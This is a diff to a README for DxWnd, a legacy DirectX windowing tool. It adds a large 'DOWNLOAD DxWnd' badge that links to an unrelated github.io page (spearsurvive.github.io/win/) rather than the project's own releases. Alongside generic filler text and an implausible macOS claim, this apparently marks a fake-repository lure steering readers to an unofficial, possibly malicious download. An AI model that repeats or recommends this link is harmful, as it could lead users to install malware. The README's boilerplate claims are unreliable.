@@ -30,6 +30,12 @@ DxWnd hooks legacy DirectX and Windows API calls to run old fullscreen-only game
 
 Whether you're a newcomer or a veteran, DxWnd provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download DxWnd](https://img.shields.io/badge/⬇_DOWNLOAD_DxWnd-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
